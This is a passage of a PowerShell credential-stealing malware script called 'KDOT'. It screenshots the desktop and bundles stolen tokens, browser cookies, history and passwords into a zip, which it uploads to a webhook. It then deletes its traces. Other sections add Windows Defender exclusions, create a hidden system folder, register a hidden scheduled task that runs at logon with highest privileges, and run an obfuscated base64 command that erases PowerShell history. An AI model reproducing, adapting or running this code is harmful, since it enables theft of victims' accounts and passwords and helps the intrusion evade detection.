    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$main_temp\screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n> :triangular_ruler: **Size:** $($bounds.width)x$($bounds.height)\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null

    Move-Item "$main_temp\tokens.txt" $folder_general -Force	
    Move-Item "$main_temp\screenshot.png" $folder_general -Force
    Move-Item -Path "$main_temp\browser-cookies.txt" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\browser-history.txt" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\browser-passwords.txt" -Destination "$browser_data" -Force

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -directory -recurse | Where-Object { (Get-ChildItem $_.fullName).count -eq 0 } | Select-Object -expandproperty FullName
        $dirs | Foreach-Object { Remove-Item $_ }
    } while ($dirs.count -gt 0)

    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    Remove-Item "$folder_general" -Force -Recurse
    Remove-Item "$main_temp\main.exe" -Force
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
    # Hidden Directory
    $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\KDOT\KDOT.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    Write-Host "Task Created" -ForegroundColor Green
    HOSTS-BLOCKER
    Backup-Data
}

if (INVOKE-AC -eq $true) {
    if ($debug -eq $true) {
        KDMUTEX
    }
    else {
        Hide-Console
        KDMUTEX
    }
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
}

